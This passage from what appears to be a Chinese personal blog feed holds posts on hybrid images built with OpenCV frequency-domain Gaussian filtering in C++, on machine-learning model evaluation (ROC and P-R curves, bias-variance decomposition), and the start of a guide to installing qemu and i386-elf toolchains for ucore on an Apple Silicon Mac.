class="collapse show" id="collapse-j9bfrylluxp18z"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;opencv2\opencv.hpp&gt;</span> </span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> cv;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{Mat high_img;Mat low_img;high_img = <span class="hljs-built_in">imread</span>(<span class="hljs-string">"C:/Users/LENOVO/Desktop/CV_course/Einstein.png"</span>);low_img = <span class="hljs-built_in">imread</span>(<span class="hljs-string">"C:/Users/LENOVO/Desktop/CV_course/Marilyn.png"</span>);Mat blurred_low;<span class="hljs-built_in">GaussianBlur</span>(low_img, blurred_low, <span class="hljs-built_in">Size</span>(<span class="hljs-number">25</span>, <span class="hljs-number">25</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);Mat einstein_mask;<span class="hljs-built_in">imshow</span>(<span class="hljs-string">"blurred"</span>, blurred_low);Mat highpassed_high;<span class="hljs-built_in">GaussianBlur</span>(high_img, highpassed_high, <span class="hljs-built_in">Size</span>(<span class="hljs-number">25</span>, <span class="hljs-number">25</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-built_in">subtract</span>(high_img, highpassed_high, highpassed_high);<span class="hljs-built_in">imshow</span>(<span class="hljs-string">"highpassed"</span>, highpassed_high);Mat hybrid_img = blurred_low + highpassed_high;<span class="hljs-built_in">imshow</span>(<span class="hljs-string">"Hybrid Image"</span>, hybrid_img);<span class="hljs-built_in">waitKey</span>(<span class="hljs-number">0</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>以经典的<code>Einstein</code>和<code>Marilyn</code>为例得到结果如下所示:</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Hybrid%20Image/20230828210855964441_824_20230329204715965717_301_image-20230329095603969.png" alt="image-20230329095603969" width="67%" height="67%"></p><h4 id="频率域高斯滤波">频率域高斯滤波</h4><p>实际上论文中原文有:</p><blockquote><p>A hybrid image <span class="math inline">\((H)\)</span> is obtainedby combining two images <span class="math inline">\(\left(I_1\right.\)</span> and <span class="math inline">\(I_2\)</span> ), one filtered with a low-passfilter <span class="math inline">\(\left(G_1\right)\)</span> and thesecond one filtered with a high-pass filter <span class="math inline">\(\left(1-G_2\right): H=I_1 \cdot G_1+I_2\cdot\left(1-G_2\right)\)</span>, the operations are defined in theFourier domain. Hybrid images</p></blockquote><p>也就是说我们需要在频率域进行操作。</p><p>一张图片可以表示成 <span class="math inline">\(\sum_{i, j} R_{ij}\)</span>, 其中 <span class="math inline">\(R_{i j}\)</span>代表作坐标为 <span class="math inline">\((i, j)\)</span>的图片像素。</p><p>过滤过的图片 <span class="math inline">\(R\)</span>, 是由滤波器 <span class="math inline">\(H\)</span> 对 <span class="math inline">\(F\)</span> 做卷积。 <span class="math display">\[\begin{aligned}R_{i j} &amp; =\sum_{u, v} H_{i-u, j-v} F_{u, v} \\\mathbf{R} &amp; =\mathbf{H} * * \mathbf{F}\end{aligned}\]</span> 与直接高斯滤波不同， <span class="math inline">\(F\)</span>是将目标图片做过傅立叶转换(FFT)，并且将频率零平移置中(FFTShift) 而产生的2D 频谱(Spectrum) 靠近中央代表低频信号,靠近边界代表高频信号。其中高频信号代表剧烈或是边角。 其中高斯滤波器<span class="math inline">\(H\)</span> 定义如下: <span class="math display">\[g(i, j)=E X P\left(-\frac{(x-i)^2+(y-j)^2}{2 \sigma^2}\right)\]</span> 其中 <span class="math inline">\(\sigma\)</span>截止频率,<span class="math inline">\((i, j)\)</span> 是图片像素点位置, 而 <span class="math inline">\((x, y)\)</span> 是中心点。</p><p>下面参照原理动手实现频率域高斯滤波操作。其中<a href="https://tigercosmos.xyz/post/2020/04/cv/hybrid-image/">这篇文章</a>的python代码给我的整体思路有较大帮助。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zn3vgwlluxp18z"></i><span>C++</span><div class="collapse show" id="collapse-zn3vgwlluxp18z"><pre><code class="hljs C++">output[<span class="hljs-number">0</span>] = img.<span class="hljs-built_in">clone</span>();output[<span class="hljs-number">1</span>] = Mat::<span class="hljs-built_in">zeros</span>(img.<span class="hljs-built_in">size</span>(), CV_32FC1);Mat complexIm;<span class="hljs-built_in">merge</span>(output, <span class="hljs-number">2</span>, complexIm); <span class="hljs-built_in">dft</span>(complexIm, complexIm);<span class="hljs-comment">// 分离通道（数组分离）</span><span class="hljs-built_in">split</span>(complexIm, output);<span class="hljs-comment">// 以下的操作是频域迁移</span><span class="hljs-built_in">fftshift</span>(output[<span class="hljs-number">0</span>], output[<span class="hljs-number">1</span>]);</code></pre></div></div><p>先将原来的图像分成实数域和复数域(暂时为0),再合并通道（把两个矩阵合并为一个2通道的Mat类容器），进行离散傅里叶变换。</p><p>为了方便观察，使用<code>fftshift</code>频域迁移将原点移到中间。<code>OpenCV</code>中没有直接给出<code>fftshift</code>的接口，但实际上它很简单，只是<code>dft</code>取了频谱上$[ 0 , f s ] $的部分，由于频谱是按 <span class="math inline">\(\mathrm{f}_{\mathrm{s}}\)</span> 周期延拓，所以<span class="math inline">\(\left[\mathrm{f}_{\mathrm{s}} / 2,\mathrm{f}_{\mathrm{s}}\right]\)</span> 部分的频谱与 <span class="math inline">\(\left[-\mathrm{f}_{\mathrm{s}} /2,0\right]\)</span> 部分的一样，如果想看 <span class="math inline">\(\left[-\mathrm{f}_{\mathrm{s}},\mathrm{f}_{\mathrm{s}}\right]\)</span> 部分，就需要做<code>fftshift</code>，将零频分量移到序列中间，对于一维，左右交换即可。图像是二维的，那么就左上和右下交换。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-55pqbtlluxp18z"></i><span>C++</span><div class="collapse show" id="collapse-55pqbtlluxp18z"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">fftshift</span><span class="hljs-params">(Mat&amp; output0, Mat&amp; output1)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">// 以下的操作是移动图像  (零频移到中心)</span><span class="hljs-type">int</span> cx = output0.cols / <span class="hljs-number">2</span>;<span class="hljs-type">int</span> cy = output0.rows / <span class="hljs-number">2</span>;<span class="hljs-function">Mat <span class="hljs-title">part1_r</span><span class="hljs-params">(output0, Rect(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, cx, cy))</span></span>;  <span class="hljs-comment">// 元素坐标表示为(cx, cy)</span><span class="hljs-function">Mat <span class="hljs-title">part2_r</span><span class="hljs-params">(output0, Rect(cx, <span class="hljs-number">0</span>, cx, cy))</span></span>;<span class="hljs-function">Mat <span class="hljs-title">part3_r</span><span class="hljs-params">(output0, Rect(<span class="hljs-number">0</span>, cy, cx, cy))</span></span>;<span class="hljs-function">Mat <span class="hljs-title">part4_r</span><span class="hljs-params">(output0, Rect(cx, cy, cx, cy))</span></span>;Mat temp;part1_r.<span class="hljs-built_in">copyTo</span>(temp);  <span class="hljs-comment">//左上与右下交换位置(实部)</span>part4_r.<span class="hljs-built_in">copyTo</span>(part1_r);temp.<span class="hljs-built_in">copyTo</span>(part4_r);part2_r.<span class="hljs-built_in">copyTo</span>(temp);  <span class="hljs-comment">//右上与左下交换位置(实部)</span>part3_r.<span class="hljs-built_in">copyTo</span>(part2_r);temp.<span class="hljs-built_in">copyTo</span>(part3_r);<span class="hljs-function">Mat <span class="hljs-title">part1_i</span><span class="hljs-params">(output1, Rect(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, cx, cy))</span></span>;  <span class="hljs-comment">//元素坐标(cx,cy)</span><span class="hljs-function">Mat <span class="hljs-title">part2_i</span><span class="hljs-params">(output1, Rect(cx, <span class="hljs-number">0</span>, cx, cy))</span></span>;<span class="hljs-function">Mat <span class="hljs-title">part3_i</span><span class="hljs-params">(output1, Rect(<span class="hljs-number">0</span>, cy, cx, cy))</span></span>;<span class="hljs-function">Mat <span class="hljs-title">part4_i</span><span class="hljs-params">(output1, Rect(cx, cy, cx, cy))</span></span>;part1_i.<span class="hljs-built_in">copyTo</span>(temp);  <span class="hljs-comment">//左上与右下交换位置(虚部)</span>part4_i.<span class="hljs-built_in">copyTo</span>(part1_i);temp.<span class="hljs-built_in">copyTo</span>(part4_i);part2_i.<span class="hljs-built_in">copyTo</span>(temp);  <span class="hljs-comment">//右上与左下交换位置(虚部)</span>part3_i.<span class="hljs-built_in">copyTo</span>(part2_i);temp.<span class="hljs-built_in">copyTo</span>(part3_i);}</code></pre></div></div><p>之后按照公式进行高斯滤波即可。取高频信号时可以直接将高斯滤波器翻转。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bdbbevlluxp18z"></i><span>C++</span><div class="collapse show" id="collapse-bdbbevlluxp18z"><pre><code class="hljs C++"><span class="hljs-function">Mat <span class="hljs-title">gaussianBlur</span><span class="hljs-params">(test.size(), CV_32FC1)</span></span>; <span class="hljs-comment">//，CV_32FC1</span><span class="hljs-keyword">if</span> (is_high){    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; test.rows; i++) {        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; test.cols; j++) {            <span class="hljs-type">float</span> d = <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">float</span>(i - test.rows / <span class="hljs-number">2</span>), <span class="hljs-number">2</span>) + <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">float</span>(j - test.cols / <span class="hljs-number">2</span>), <span class="hljs-number">2</span>);            gaussianBlur.<span class="hljs-built_in">at</span>&lt;<span class="hljs-type">float</span>&gt;(i, j) = <span class="hljs-number">1</span> - <span class="hljs-built_in">expf</span>(-d / (<span class="hljs-number">2</span> * sigma * sigma));        }    }}<span class="hljs-keyword">else</span> {    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; test.rows; i++) {        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; test.cols; j++) {            <span class="hljs-type">float</span> d = <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">float</span>(i - test.rows / <span class="hljs-number">2</span>), <span class="hljs-number">2</span>) + <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">float</span>(j - test.cols / <span class="hljs-number">2</span>), <span class="hljs-number">2</span>);            gaussianBlur.<span class="hljs-built_in">at</span>&lt;<span class="hljs-type">float</span>&gt;(i, j) = <span class="hljs-built_in">expf</span>(-d / (<span class="hljs-number">2</span> * sigma * sigma));        }    }}</code></pre></div></div><p>得到高斯滤波器后对图片进行过滤，实部虚部分别与滤波器模板对应元素相乘。最后还要进行逆变换，归一化，得到最终滤波图像。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-z6tuo6lluxp18z"></i><span>C++</span><div class="collapse show" id="collapse-z6tuo6lluxp18z"><pre><code class="hljs C++">Mat blur_r, blur_i, blur_full;<span class="hljs-built_in">multiply</span>(output[<span class="hljs-number">0</span>], gaussianBlur, blur_r);<span class="hljs-built_in">multiply</span>(output[<span class="hljs-number">1</span>], gaussianBlur, blur_i);Mat blur_split[] = { blur_r, blur_i };<span class="hljs-built_in">fftshift</span>(blur_split[<span class="hljs-number">0</span>], blur_split[<span class="hljs-number">1</span>]);<span class="hljs-built_in">merge</span>(blur_split, <span class="hljs-number">2</span>, blur_full);<span class="hljs-built_in">idft</span>(blur_full, blur_full);blur_full = blur_full / blur_full.rows / blur_full.cols; <span class="hljs-comment">// 归一化</span><span class="hljs-built_in">split</span>(blur_full, output);output[<span class="hljs-number">0</span>] = output[<span class="hljs-number">0</span>] / <span class="hljs-number">255</span>;</code></pre></div></div><p>我们还可以将离散傅里叶变换得到的结果转换成幅值矩阵展示出来:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-a77njilluxp18z"></i><span>C++</span><div class="collapse show" id="collapse-a77njilluxp18z"><pre><code class="hljs C++">Mat amplitude;<span class="hljs-built_in">magnitude</span>(output[<span class="hljs-number">0</span>], output[<span class="hljs-number">1</span>], amplitude);amplitude = amplitude + Scalar::<span class="hljs-built_in">all</span>(<span class="hljs-number">1</span>);<span class="hljs-built_in">log</span>(amplitude, amplitude);<span class="hljs-built_in">normalize</span>(amplitude, amplitude, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, NORM_MINMAX);<span class="hljs-built_in">imshow</span>(text, amplitude);</code></pre></div></div><p>一般来说，低频的信号幅值大，组成一个信号的基本面，高频的信号幅值小，刻画细节、轮廓。</p><p>对傅里叶变换及应用的粗浅理解参照了<a href="https://juejin.cn/post/7188914545476239418">这里</a>。</p><h3 id="结果展示">结果展示</h3><p>使用OpenCV附带的Trackbar功能实现了自动调节截止频率的功能。展示如下:</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Hybrid%20Image/20230828210857054735_334_20230329204718785139_962_image-20230329110649015.png" alt="image-20230329110649015" width="67%" height="67%"></p><p>可以看到<span class="math inline">\(\sigma=16\)</span>时能够取得较好的混合效果。</p><p>得到两个图片的幅值矩阵如下所示:</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Hybrid%20Image/20230828210858221680_112_20230329204722119165_954_image-20230329112108249.png" alt="image-20230329112108249" width="67%" height="67%"></p><p>换用自己喜欢的图像尝试一下:</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Hybrid%20Image/20230828210859490938_460_20230329204725159317_763_image-20230329112218382.png" alt="image-20230329112218382" width="67%" height="67%"></p><p>因为这两张图片都不存在明显的高频信号，因此不是一个很好的样例。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机视觉</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习-模型评估与选择</title>
    <link href="/posts/4810/"/>
    <url>/posts/4810/</url>
    
    <content type="html"><![CDATA[<h2 id="模型评估与选择">模型评估与选择</h2><h3 id="模型评估方法">模型评估方法</h3><p>书后习题</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205809208213_235_20220930234157710423_473_image-20220930231043281.png" alt="image-20220930231043281"><figcaption aria-hidden="true">image-20220930231043281</figcaption></figure><h3 id="经验误差和泛化误差">经验误差和泛化误差</h3><h4 id="定义">定义</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205812256325_334_20220930234159328307_660_image-20220930140833923.png" alt="image-20220930140833923"><figcaption aria-hidden="true">image-20220930140833923</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205813431862_658_20220930234200690193_368_image-20220930141041690.png" alt="image-20220930141041690"><figcaption aria-hidden="true">image-20220930141041690</figcaption></figure><h4 id="解决过拟合现象正则化">解决过拟合现象：正则化</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205815454555_696_20220930234202870906_724_image-20220930141142762.png" alt="image-20220930141142762"><figcaption aria-hidden="true">image-20220930141142762</figcaption></figure><h3 id="性能度量">性能度量</h3><h4 id="基本概念">基本概念</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205818125789_846_20220930234204833875_372_image-20220930163038120.png" alt="image-20220930163038120"><figcaption aria-hidden="true">image-20220930163038120</figcaption></figure><h4 id="p-r曲线和roc曲线">P-R曲线和ROC曲线</h4><h5 id="实例">实例</h5><p><a href="https://zhuanlan.zhihu.com/p/92218196">知乎</a>上有一个案例对这些曲线描述的比较形象。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205819444654_648_20220930234208101296_478_image-20220930194835021.png" alt="image-20220930194835021"><figcaption aria-hidden="true">image-20220930194835021</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205820611781_176_20220930234209475943_307_image-20220930194858579.png" alt="image-20220930194858579"><figcaption aria-hidden="true">image-20220930194858579</figcaption></figure><p>TPR真阳性，FPR假阳性</p><p>一个表现平平的分类器(表现是指分类标准能否将两种样本有效的分开，而threshold是指划分标准更倾向于查全率或准确率)</p><p align="center"><img alt="image-20220927211547461" height="" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205821765720_481_20220930234211807031_249_norm.gif" width=""></p>一个更好一些的分类器<p align="center"><img alt="image-20220927211547461" height="" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205824598151_175_20220930234215190380_315_norm2.gif" width=""></p><p>F1计算</p><p align="center"><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205826410667_477_20220930234218188978_486_F1.gif" width="" hight=""></p><h5 id="用途">用途</h5><p>基于P-R曲线可以大致评判机器学习模型的好坏</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205828242463_385_20220930234219845677_195_image-20220930224302678.png" alt="image-20220930224302678"><figcaption aria-hidden="true">image-20220930224302678</figcaption></figure><p>ROC也是如此。</p><p>从定义可知， AUC 可 通过对 ROC 曲 线下各部分的面积 求和而得.</p><p>形式化地看， AUC 考虑的是样本预测的排序质量。</p><p>习题：若学习器A的F1值比学习器B高，试析A的BEP值是否也比B高</p><p>二者是不同维度的指标。当然在达到BEP的条件时(P=R)，F1的值和BEP相等。</p><h4 id="roc代价曲线">ROC代价曲线</h4><p>参考<a href="https://www.zhihu.com/question/63492375">知乎答案</a></p><p>首先, 横坐标是 <span class="math inline">\(\mathrm{P}(+)\)</span>,由公式3可以知道, 当 <span class="math inline">\(\mathrm{P}(+)=0\)</span>时, <span class="math inline">\({c o s t}_{n o rm}=\mathrm{FPR}\)</span>; 当 <span class="math inline">\(\mathrm{P}(+)=1\)</span> 时, <span class="math inline">\(\operatorname{cost}_{n o rm}=\mathrm{FNR}_{\circ}\)</span> 直白含义：当我用来检测模型好坏的样本全是负例(即 $(+)=0 $)，那我模型产生的错误就只有负例被错误的预测 为正例这一种情况, 就是 <span class="math inline">\((0, F P R)\)</span> 。 同样,当我用来检测模型好坏的样本全都是正例（即 $(+)=1 $)，那我模型产生的错误就只有正例被错 误的预测为负例的情况这一种情况，就是<span class="math inline">\((1, \mathrm{FNR})\)</span>两个连线中间的情况, 用来检测模型的样本有正例也有负例的时候, 也就是 <span class="math inline">\(P(+)=0 . x\)</span>, 这时候 <span class="math inline">\(\operatorname{cost}_{n o r m}\)</span>的取值就会同时受到FPR和FNR的影响。</p><p>很像高中化学读图题的定性分析：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205830154968_899_20220930234221742723_477_image-20220930222355725.png" alt="image-20220930222355725"><figcaption aria-hidden="true">image-20220930222355725</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205831728167_536_20220930234223625316_668_image-20220930222637642.png" alt="image-20220930222637642"><figcaption aria-hidden="true">image-20220930222637642</figcaption></figure><p>就像做核酸”粉饰太平“一样( <span class="math display">\[P(+)=\frac{p \cdot \cos _{0 \mid 1}}{p \cdot \operatorname{cost}_{0 \mid1}+(1-p) \cdot \operatorname{cost}_{1 \mid 0}}\]</span> <span class="math inline">\(\operatorname{cost}_{0 \mid1}\)</span> 表示: 实际为正类, 而错判成负类的代价, <span class="math inline">\(\operatorname{cost}_{1 \mid 0}\)</span> 表示:实际为负类, 而错判成正类类Q 的代价。 举例说明, 当我们认为,正例错判为负例的代价与负例错判为正例的代价相同时, <span class="math inline">\(P^1(+)=p\)</span>当我们认为把正类判定为负类会造成更大的损失时(比如假设核酸检测瞒报比误报代价更大),此时 <span class="math inline">\(\operatorname{cost}_{1 \mid 0}&gt;;\cost_{0 \mid 1}\)</span>, 带入正例代价公式 得 <span class="math inline">\(P^2(+)\)</span>, 这时候就有 <span class="math inline">\(P^2(+)&gt;;P^1(+)\)</span> 。 对应到ROC代价图,正例概率 <span class="math inline">\(P(+)\)</span> 就会往左移动,对应的阈值就会减小, 模型对负类的判断就会更谨慎(比如下调CT值)。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205832760860_905_20220930234224685263_266_image-20220930142416369.png" alt="image-20220930142416369"><figcaption aria-hidden="true">image-20220930142416369</figcaption></figure><p><span class="math inline">\(\beta\)</span>&gt;1时查全率有更大影响；<span class="math inline">\(\beta\)</span>&lt;1时查准率有更大影响。</p><p>(核酸检测评价假设偏向减少瞒报，则<span class="math inline">\(\beta&gt;1\)</span>)</p><h3 id="比较检验">比较检验</h3><p>单边t检验和成对t检验可以分别用于评价单个学习器的错误率和比较两个学习器的性能。</p><p>对二分类问题，使用留出法不仅可估计出学习器 A 和 B的测试错误率，还可获得两学习器分类结果的差别，使用McNemar检验可以做到。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205834083424_981_20220930234226080145_532_image-20220930233428713.png" alt="image-20220930233428713"><figcaption aria-hidden="true">image-20220930233428713</figcaption></figure><p>$Min-max$规范化优点：1、计算相对简单一点。2、当新样本进来时，只有在新样本大于原最大值或者小于原最小值时，才需要重新计算规范化之后的值。缺点在于：1、容易受高杠杆点和离群点影响。</p><p><span class="math inline">\(z-score\)</span>规范化优点：1、对异常值敏感低。缺点在于：1、计算更负责。2、每次新样本进来都需要重新计算规范化。</p><h3 id="偏差方差分解">偏差方差分解</h3><p>用途：解释算法泛化性能来源的手段 <span class="math display">\[E(f ;D)=\operatorname{bias}^2(\boldsymbol{x})+\operatorname{var}(\boldsymbol{x})+\varepsilon^2,\]</span> 也就是说, 泛化误差可分解为偏差、方差与噪声之和。</p><p>注意这个式子的推导，详见南瓜书。</p><ul><li><strong>「偏差」</strong>度量了学习算法的期望预测与真实结果的偏离程度，即<strong>「刻画了学习算法本身的拟合能力」</strong>；</li><li><strong>「方差」</strong>度量了同样大小的训练集的变动所导致的学习性能的变化，即<strong>「刻画了数据扰动所造成的影响」</strong>;</li><li><strong>「噪声」</strong>则表达了在当前任务上任何学习算法所能达到的期望泛化误差的下界，即<strong>「刻画了学习问题本身的难度」</strong>.</li></ul><p>偏差一方差分解说明，泛化性能是由<strong>「学习算法的能力」</strong>、<strong>「数据的充分性」</strong>以及<strong>「学习任务本身的难度所共同决定」</strong>的。</p><p align="center"><img alt="image-20220930230353084" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205835267931_997_20220930234228241789_843_image-20220930230353084.png" width="50%"></p><p>随训练强度，偏差减小，方差增大，即学习的越充分，但受数据影响越大，可能出现过拟合现象。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ucore Lab0 on Apple Silicon Mac</title>
    <link href="/posts/23191/"/>
    <url>/posts/23191/</url>
    
    <content type="html"><![CDATA[<h2 id="ucore-lab0-on-apple-silicon-mac">Ucore Lab0 on Apple SiliconMac</h2><h3 id="介绍">介绍</h3><p>M1芯片是2020年之后推出的全新适配于Macbook的Arm64芯片。因为底层的指令集与x86_64不同，因此面临着很多兼容性的问题。在ucore的编译，运行和调试的环境配置中也因此踩了一些坑。当然最终得以能够优雅的在这台具有独特架构的PC上探索实现操作系统的魅力。</p><p>现在将其记录下来，以供参考。</p><h3 id="qemu安装">qemu安装</h3><p>qemu是非常成熟的虚拟化解决方案，通过软件的方式逐条将目标文件的二进制指令翻译成目标架构支持的二进制指令，虽然效率不高，但是使用方便，对M1芯片支持也比较完善，足够用来调试ucore了。</p><p>指导书中针对linux给出了使用包管理工具的安装方案。在mac上这个过程也同样比较简单。安装<code>homebrew</code>包管理工具后只需要</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hgu064lluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-hgu064lluwpkzu"><pre><code class="hljs shell">brew install qemu</code></pre></div></div><p>即可。当然为了保证是最新版本，安装之前可以更新一下homebrew：<code>brew update</code>。</p><h3 id="i386-elf-gcc和i386-elf-gdb安装">i386-elf-gcc和i386-elf-gdb安装</h3><p>按照网上的解决方案，我安装了<code>macport</code>，并</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9k5fk8lluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-9k5fk8lluwpkzu"><pre><code class="hljs shell">sudo port -v selfupdatesudo port install i386-elf-gcc</code></pre></div></div><p>但是发现它安装过程中构建失败了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210509161934_583_20221003231400206876_223_image-20221003224714488.png" alt="image-20221003224714488"><figcaption aria-hidden="true">image-20221003224714488</figcaption></figure><p>查看发现果然是架构问题：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210510441170_930_20221003231401953713_177_image-20221003224809467.png" alt="image-20221003224809467"><figcaption aria-hidden="true">image-20221003224809467</figcaption></figure><p>查看报错信息。谷歌后从<a href="https://github.com/riscv-collab/riscv-gnu-toolchain/issues/800">githubissue</a>中得知是有支持apple silicon版本的最新i386-elf-gcc的。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210511905247_542_20221003231403860364_202_image-20221003225239013.png" alt="image-20221003225239013"><figcaption aria-hidden="true">image-20221003225239013</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210513865427_993_20221003231405125684_549_image-20221003225245971.png" alt="image-20221003225245971"><figcaption aria-hidden="true">image-20221003225245971</figcaption></figure><p>有希望！但是按官网命令安装问题也没有解决，所谓补丁也不起效。后来尝试用homebrew安装：<code>brew install i386-elf-gdb</code>，但没有安装成功。提示</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" 